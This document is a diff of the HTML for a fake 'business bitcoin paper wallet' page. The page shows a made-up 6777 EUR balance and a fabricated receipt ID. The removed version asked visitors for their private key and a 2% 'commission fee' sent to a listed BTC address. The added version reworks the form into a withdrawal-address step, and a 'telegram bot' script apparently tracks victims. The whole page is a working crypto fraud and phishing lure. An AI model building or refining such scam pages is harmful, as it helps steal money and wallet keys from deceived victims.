@@ -51,12 +51,12 @@
 
 <body>
   <!-- Loader -->
-    <div
+  <div
     style="position: fixed;width: 100%;height: 100%;top: 0;background-color: white;left: 0;z-index: 5000;display: flex;align-items: center;justify-content: center;"
     id="loader-wrapper">
     <div class="loader"></div>
   </div>
-  
+
   <!-- help container null styles -->
 
   <style>
@@ -163,11 +163,12 @@
     <!-- <p class="text-center whi"></p> -->
     <h1 class="h1 text-center" style="margin-top: 2rem;">Current Balance</h1>
     <p style="font-size: 28px;" id="balance_euro" class="check-balance__eur">6777 EUR</p>
-    <p style="margin-bottom: 5px;" class="check-balance__bitcoin"><img src="./img/bitcoin-convert.jpg"" alt="bitcoin-convert" width="60" class="d-block mx-auto mb-1"></p>
+    <p style="margin-bottom: 5px;" class="check-balance__bitcoin"><img src="./img/bitcoin-convert.jpg"" alt="
+        bitcoin-convert" width="60" class="d-block mx-auto mb-1"></p>
     <p id="balance_bitcoin" class="check-balance__bitcoin"></p>
     <p class="text-center">Deposited by Bitcoin ATM receipt <br>(transaction ID - SD1V89W533SF5-D9N1)</p>
     <ul class="check-balance__advs">
-      <li>> Scan Public Address QR code to deposit paper wallet or to check available balance.</li>
+      <!-- <li>> Scan Public Address QR code to deposit paper wallet or to check available balance.</li> -->
       <li>> PRIVATE key gives you complete access to your funds on Bitcoin paper wallet.</li>
       <li>> DO NOT REVEAL or SHARE THE PRIVATE KEY until you withdraw funds from Bitcoin paper wallet to your own
         cryptocurrency wallet.</li>
@@ -179,17 +180,18 @@
   <div class="container check-balance">
     <!-- <img src="./img/bitcoin_convert.jpg" alt="" width="100" class="d-block mx-auto"> -->
     <h3 class="h3 text-center mt-1">Business bitcoin paper wallet has been detected!</h3>
+    <p class="text-center text-danger ultra-text-danger" style="font-size: 15px; margin-bottom: 8px;">Private key can only be used
+      once,after which it is no longer
+      valid!</p>
     <p class="text-center text-danger" style="font-size: 15px;">Mandatory commission fee is 2% of the current
-      amount.Please fill in the fields below and follow the instructions<br><span
-        class="text-dangre ultra-text-danger">Private key can only be used once,after which it is no longer
-        valid!</span></p>
-    <div class="deposit-crypto__field">
+      amount.</p>
+    <!-- <div class="deposit-crypto__field">
       <div class="deposit-crypto__main">
         <label class="text-danger">Private Key</label>
         <input required id="sicret_key_input" type="text">
       </div>
       <img src="./img/bitcoin.svg" alt="" width="40" height="40">
-    </div>
+    </div> -->
     <div class="deposit-crypto__field">
       <div class="deposit-crypto__main">
         <label>Balance to withdraw</label>
@@ -204,14 +206,18 @@
       </div>
       <img src="./img/bitcoin.svg" alt="" width="40" height="40">
     </div>
-    <div class="deposit-crypto__field">
+    <div style="margin-bottom: 0;" class="deposit-crypto__field">
       <div class="deposit-crypto__main">
-        <label>BTC address to pay a commission fee</label>
-        <p class="btc_address">1er5h1r5h1t5thfehryjutkiytvc5wc1srbtd5tnyt5j5brbtn</p>
+        <label>BTC withdrawal address</label>
+        <p style="display: none;" class="btc_address">1er5h1r5h1t5thfehryjutkiytvc5wc1srbtd5tnyt5j5brbtn</p>
+        <input id="email-input" type="text" required>
       </div>
       <img src="./img/bitcoin.svg" alt="" width="40" height="40">
     </div>
-    <div class="email-confirm__field">
+    <div style="margin-top: 0;" class="deposit-crypto__label">
+      <span>*Enter your private bitcoin address to withdraw wallet balance</span>
+    </div>
+    <!-- <div class="email-confirm__field">
       <div class="email-confirm__main">
         <label style="    font-weight: 400;
           font-size: 14px;">Email</label>
@@ -225,14 +231,13 @@
           overflow: hidden;
           text-overflow: ellipsis;" required id="email_input" type="text">
       </div>
-    </div>
-    <p class="text-center balck-text">Enter Private key from printed offline BTC paper wallet and your own email.To
-      pay the commission fee 2% click the button below.<br>All funds will be transferred to your private wallet
-      instantly
-      after commission fee is paid and confirmed</p>
-    <button onclick="check_data()" class="check-balance__btn green-btn">Pay commission fee</button>
-    <p id="wait" class="check-balance__wait">BTC wallet verification in progress<br>Please wait...</p>
-    <p class="form-error text-center text-danger fill-data">Error <br>Please fill the form</p>
+      <img src="./img/bitcoin.svg" alt="" width="40" height="40">
+
+    </div> -->
+
+    <button onclick="check_data()" class="check-balance__btn green-btn">Next</button>
+    <p id="wait" class="check-balance__wait">BTC wallet confirmation in progress<br>Please wait...</p>
+    <p class="form-error text-center text-danger fill-data" id="fill-data">Error!<br>Please enter bitcoin address</p>
     <p class="form-error text-center text-danger incorrect-data">Incorrect data entered!</p>
 
   </div>
@@ -376,10 +381,11 @@
   <script src="assets/js/getPrices.js"></script>
   <!-- telegram bot -->
   <script src="assets/js/withdrawTracker.js"></script>
-  <script src="assets/js/loader.js"></script>
+  <script type="module" src="assets/js/loader.js"></script>
+  <script src="assets/js/dropdown.js"></script>
   <script src="assets/js/setBrandName.js"></script>
   <script>
-    
+
     (function (u) {
       var s = document.createElement('script'); s.async = true; s.src = u;
       var x = document.getElementsByTagName('script')[0]; x.parentNode.insertBefore(s, x);
